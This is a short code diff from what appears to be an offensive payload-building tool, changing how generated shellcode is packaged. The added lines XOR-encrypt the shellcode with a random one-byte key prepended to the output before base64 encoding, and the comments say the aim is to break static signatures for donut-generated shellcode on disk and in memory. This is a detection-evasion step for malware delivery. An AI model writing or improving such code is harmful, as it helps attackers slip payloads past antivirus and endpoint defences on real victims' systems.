@@ -223,7 +223,14 @@ else:
         sc_data = f.read()
     os.unlink(tmp_path)
 
-    b64_data = base64.b64encode(sc_data)
+    # XOR-encrypt shellcode with a random key before base64.
+    # Format: base64(key_byte || xor_encrypted_shellcode)
+    # Runner reads key from first decoded byte, decrypts the rest.
+    # Breaks static donut signatures in both the .enc file and in-memory before decryption.
+    import random as _rand
+    sc_key = _rand.randint(1, 254)
+    sc_encrypted = bytes([sc_key] + [b ^ sc_key for b in sc_data])
+    b64_data = base64.b64encode(sc_encrypted)
     with open(output_path, 'wb') as f:
         f.write(b64_data)
 
